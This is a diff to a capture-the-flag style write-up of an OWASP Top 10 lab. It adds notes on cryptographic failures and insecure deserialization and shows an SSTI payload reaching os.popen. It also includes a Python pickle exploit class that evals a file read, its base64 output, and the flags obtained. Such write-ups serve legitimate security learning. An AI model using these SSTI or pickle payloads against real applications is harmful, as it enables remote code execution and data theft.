@@ -132,6 +132,9 @@ All come from the same root cause: weak foundations
 >A04: Cryptographic Failures
 >A05: Injection
 >A08: Software or Data Integrity Failures
+# A04: Cryptographic Failures
+challenege: http://10.48.138.35:8001.
+
 # A05: Injection
 You can access this portion of the practical on http://10.48.138.35:8000.
 {{7*7}} its working
@@ -139,6 +142,25 @@ The payload {{self.__init__.__globals__['__builtins__']['__import__']('os').pope
 <img width="1114" height="848" alt="image" src="https://github.com/user-attachments/assets/2642b71b-d067-433b-a4ee-9a5226a280fc" />
 Flag: THM{SSTI_FLAG_OBTAINED}
 # A08: Software or Data Integrity Failures
+<img width="1003" height="783" alt="image" src="https://github.com/user-attachments/assets/bcb860af-e435-43a2-b36d-8ae378cb7b39" />
+below you  can see
+import pickle
+import base64
+
+class Malicious:
+    def __reduce__(self):
+        # Return a tuple: (callable, args)
+        # This will execute: open('flag.txt').read()
+        return (eval, ("open('flag.txt').read()",))
+
+# Generate and encode the payload
+payload = pickle.dumps(Malicious())
+encoded = base64.b64encode(payload).decode()
+print(encoded)
+OUTPUT OF THE CODE :gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
+<img width="1003" height="783" alt="image" src="https://github.com/user-attachments/assets/bc7230b0-f8c6-4d2e-a482-3a94556b3d93" />
+
+Flag:THM{INSECURE_DESERIALIZATION}
 
 
 
